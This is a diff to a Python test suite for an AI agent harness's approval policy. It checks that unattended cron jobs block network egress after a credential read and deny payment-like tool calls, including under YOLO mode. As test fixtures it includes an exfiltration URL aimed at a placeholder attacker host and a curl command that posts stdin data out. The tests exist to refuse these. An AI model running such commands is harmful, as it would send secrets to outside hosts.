@@ -2,9 +2,12 @@
 
 Verifies:
 1. A declared capability set pre-approves a clean ask; an undeclared one denies it fail-closed.
-2. Credential data read earlier in the run blocks network egress, except toward trusted hosts.
+2. A credential read earlier in the run blocks network egress; only a fetch or navigation to trusted hosts is exempt.
 3. Asks outside the job's directories, or on sensitive/protected files, are denied, not pre-approved.
-4. The decision holds end to end through the approval middleware, with the LLM reviewer unavailable.
+4. A payment-like tool call is denied even when the job declared the capability: a declaration does not cover spending.
+5. The decision holds end to end through the approval middleware, with the LLM reviewer unavailable.
+6. With YOLO on, an unattended payment-like call is denied instead of left waiting for an approval nobody can give,
+   and an attended session still waits for the user.
 """
 
 from __future__ import annotations
@@ -27,7 +30,10 @@ from myrm_agent_harness.agent.middlewares.approval import (
     set_workspace_root,
 )
 from myrm_agent_harness.agent.middlewares.approval._cron_policy import CronAskVerdict, resolve_cron_ask
-from myrm_agent_harness.agent.middlewares.approval.batch_processor import register_security_reviewer
+from myrm_agent_harness.agent.middlewares.approval.batch_processor import (
+    evaluate_tool_batch,
+    register_security_reviewer,
+)
 from myrm_agent_harness.agent.middlewares.approval.helpers import clear_all_session_denials_for_tests
 from myrm_agent_harness.agent.security.audit import get_audit_entries, reset_audit_log
 from myrm_agent_harness.agent.security.channel_presets import build_channel_security_config
@@ -43,6 +49,10 @@ from myrm_agent_harness.toolkits.code_execution.security import (
 _CAPABILITIES = ("net_fetch", "file_read", "file_write", "code_interpreter")
 _EXFIL_URL = "https://attacker.example/collect"
 _VENDOR_SEND = "acme-cli send --to a@b.com --subject Hi"
+_PAYMENT_CALLS = [
+    pytest.param("mcp__stripe__create_payment_intent", {"amount": 1999, "currency": "usd"}, id="keyword-in-name"),
+    pytest.param("mcp__shop__quick_order", {"total_amount": 1999}, id="amount-argument"),
+]
 
 
 class MockRuntime:
@@ -160,8 +170,8 @@ class TestResolveCronAsk:
         _read_credentials()
         trusted = dataclasses.replace(config, network_allowlist=("api.example.com",))
 
-        assert not _ask(trusted, dirs, "web_fetch_tool", {"url": "https://api.example.com/v1"}).denied
-        assert _ask(trusted, dirs, "web_fetch_tool", {"url": _EXFIL_URL}).denied
+        assert not _ask(trusted, dirs, "web_fetch_tool", {"urls": ["https://api.example.com/v1"]}).denied
+        assert _ask(trusted, dirs, "web_fetch_tool", {"urls": [_EXFIL_URL]}).denied
 
     def test_path_outside_the_job_directories_is_denied(self, config: SecurityConfig, dirs: Dirs) -> None:
         verdict = _ask(config, dirs, "grep_tool", {"path": str(dirs.elsewhere)})
@@ -192,6 +202,25 @@ class TestResolveCronAsk:
 
         set_session_access_roots((AccessRoot(path=str(dirs.elsewhere), writable=True),))
         assert not _ask(config, dirs, "grep_tool", {"path": str(dirs.elsewhere / "x")}).denied
+
+    @pytest.mark.parametrize(("tool_name", "tool_input"), _PAYMENT_CALLS)
+    def test_payment_like_call_is_denied_although_capabilities_are_declared(
+        self, config: SecurityConfig, dirs: Dirs, tool_name: str, tool_input: dict[str, object]
+    ) -> None:
+        verdict = _ask(config, dirs, tool_name, tool_input)
+
+        assert verdict.denied
+        assert verdict.audit_reason == "cron fail-closed: payment-like tool call"
+        assert "payment-like" in verdict.tool_message
+
+    def test_declared_mcp_call_that_is_no_payment_is_still_pre_approved(
+        self, config: SecurityConfig, dirs: Dirs
+    ) -> None:
+        assert not _ask(config, dirs, "mcp__notes__create_note", {"title": "x"}).denied
+
+
+def _yolo_config() -> SecurityConfig:
+    return build_channel_security_config("cron", {"yoloModeEnabled": True}, declared_capabilities=("mcp_invoke",))
 
 
 async def _denials(tool_name: str, args: dict[str, object]) -> list[str]:
@@ -278,3 +307,87 @@ class TestCronRunThroughTheMiddleware:
         denials = await _denials("file_write_tool", {"path": str(dirs.workspace / "notes.md"), "content": "x"})
 
         assert len(denials) == 1
+
+    @pytest.mark.parametrize(("tool_name", "tool_input"), _PAYMENT_CALLS)
+    async def test_payment_like_mcp_call_is_denied_and_audited_when_mcp_invoke_is_declared(
+        self, tool_name: str, tool_input: dict[str, object]
+    ) -> None:
+        set_security_config(build_channel_security_config("cron", declared_capabilities=("mcp_invoke",)))
+
+        denials = await _denials(tool_name, tool_input)
+
+        assert len(denials) == 1
+        assert "payment-like" in denials[0]
+        assert any(e.decision == "CRON_DENY" and e.tool_name == tool_name for e in get_audit_entries())
+
+    async def test_declared_mcp_call_that_is_no_payment_runs(self) -> None:
+        set_security_config(build_channel_security_config("cron", declared_capabilities=("mcp_invoke",)))
+
+        assert await _denials("mcp__notes__create_note", {"title": "x"}) == []
+
+    @pytest.mark.parametrize(("tool_name", "tool_input"), _PAYMENT_CALLS)
+    async def test_payment_like_call_is_denied_and_audited_under_yolo(
+        self, tool_name: str, tool_input: dict[str, object]
+    ) -> None:
+        set_security_config(_yolo_config())
+
+        denials = await _denials(tool_name, tool_input)
+
+        assert len(denials) == 1
+        assert "payment-like" in denials[0]
+        assert any(e.decision == "CRON_DENY" and e.tool_name == tool_name for e in get_audit_entries())
+
+
+async def _yolo_batch(tool_name: str, args: dict[str, object], *, session_key: str) -> tuple[int, int, int]:
+    """Approved, denied and pending counts for one call evaluated with YOLO on."""
+    approved, denied, pending = await evaluate_tool_batch(
+        [ToolCall(type="tool_call", name=tool_name, args=args, id="call_1")],
+        _yolo_config(),
+        is_cron=session_key.startswith("cron:"),
+        workspace_root="/tmp",
+        session_key=session_key,
+        args_hashes={},
+        is_interactive=False,
+    )
+    return len(approved), len(denied), len(pending)
+
+
+class TestYoloPaymentsWithNobodyToApprove:
+    @pytest.mark.parametrize(("tool_name", "tool_input"), _PAYMENT_CALLS)
+    async def test_unattended_payment_like_call_is_denied_not_left_pending(
+        self, tool_name: str, tool_input: dict[str, object]
+    ) -> None:
+        assert await _yolo_batch(tool_name, tool_input, session_key="cron:job-1") == (0, 1, 0)
+
+    async def test_a_declared_call_that_is_no_payment_still_runs(self) -> None:
+        assert await _yolo_batch("mcp__notes__create_note", {"title": "x"}, session_key="cron:job-1") == (1, 0, 0)
+
+    @pytest.mark.parametrize(("tool_name", "tool_input"), _PAYMENT_CALLS)
+    async def test_attended_session_still_waits_for_the_user(
+        self, tool_name: str, tool_input: dict[str, object]
+    ) -> None:
+        assert await _yolo_batch(tool_name, tool_input, session_key="chat:1") == (0, 0, 1)
+
+
+class TestTrustedHostsExemptOnlyUrlArguments:
+    @pytest.mark.parametrize(
+        ("tool_name", "tool_input"),
+        [
+            pytest.param(
+                "bash_code_execute_tool",
+                {"command": "curl -d @- https://api.example.com/v1"},
+                id="shell-command-with-a-trusted-host",
+            ),
+            pytest.param("browser_snapshot_tool", {"scope": "content"}, id="snapshot-without-a-url"),
+        ],
+    )
+    def test_a_call_without_a_url_argument_stays_refused_after_a_credential_read(
+        self, config: SecurityConfig, dirs: Dirs, tool_name: str, tool_input: dict[str, object]
+    ) -> None:
+        _read_credentials()
+        trusted = dataclasses.replace(config, network_allowlist=("api.example.com",))
+
+        verdict = _ask(trusted, dirs, tool_name, tool_input)
+
+        assert verdict.denied
+        assert verdict.audit_reason == "cron fail-closed: network egress after credential read"
